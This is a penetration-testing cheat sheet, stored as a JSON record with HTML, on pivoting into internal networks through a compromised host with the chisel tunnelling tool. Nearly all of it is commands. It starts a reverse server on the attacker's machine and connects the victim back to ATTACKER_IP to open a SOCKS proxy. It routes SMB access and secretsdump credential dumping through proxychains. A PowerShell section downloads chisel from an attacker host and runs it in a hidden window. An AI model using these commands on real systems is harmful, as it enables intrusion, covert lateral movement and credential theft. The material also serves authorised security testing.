{"title": "chisel", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/ref-pivoting-chisel", "html": "<h1 id=\"pivoting-chisel\">chisel</h1>\n<p>&gt; SOCKS proxy through a compromised host. Use when you need to reach an internal network. Fast to deploy, works through firewalls.</p>\n<h3>Setup</h3>\n<h4>Server (attacker)</h4>\n<pre><code class=\"language-bash\">chisel server --reverse -p 8888</code></pre>\n<h4>Client (compromised host)</h4>\n<pre><code class=\"language-bash\"># SOCKS proxy (most common)\nchisel client ATTACKER_IP:8888 R:1080:socks\n\n# Specific port forward\nchisel client ATTACKER_IP:8888 R:LOCAL_PORT:TARGET_IP:REMOTE_PORT</code></pre>\n<h3>proxychains Config</h3>\n<pre><code class=\"language-ini\"># /tmp/proxychains.conf\n[ProxyList]\nsocks5 127.0.0.1 1080</code></pre>\n<h3>Usage</h3>\n<pre><code class=\"language-bash\">proxychains4 -f /tmp/proxychains.conf nxc smb &lt;target-ip&gt; -u user -p pass\nproxychains4 -f /tmp/proxychains.conf secretsdump.py ...</code></pre>\n<h3>Windows Client Deployment</h3>\n<pre><code class=\"language-powershell\">Invoke-WebRequest -Uri &quot;http://ATTACKER:8080/chisel64.exe&quot; -OutFile &quot;C:\\Users\\Public\\c.exe&quot;\nStart-Process &quot;C:\\Users\\Public\\c.exe&quot; -ArgumentList &quot;client&quot;,&quot;ATTACKER:8888&quot;,&quot;R:1080:socks&quot; -WindowStyle Hidden</code></pre>\n<h3>Limitations</h3>\n<p>- Kerberos multi-step auth may fail through SOCKS — use Ligolo-ng for Kerberos - NTLM auth works fine - AV may quarantine the binary</p>", "excerpt": "chisel &gt; SOCKS proxy through a compromised host. Use when you need to reach an internal network. Fast to deploy, works through firewalls. Setup Server (attacker) chisel server --reverse -p 8888 Cli…", "tags": ["reference", "pivoting"]}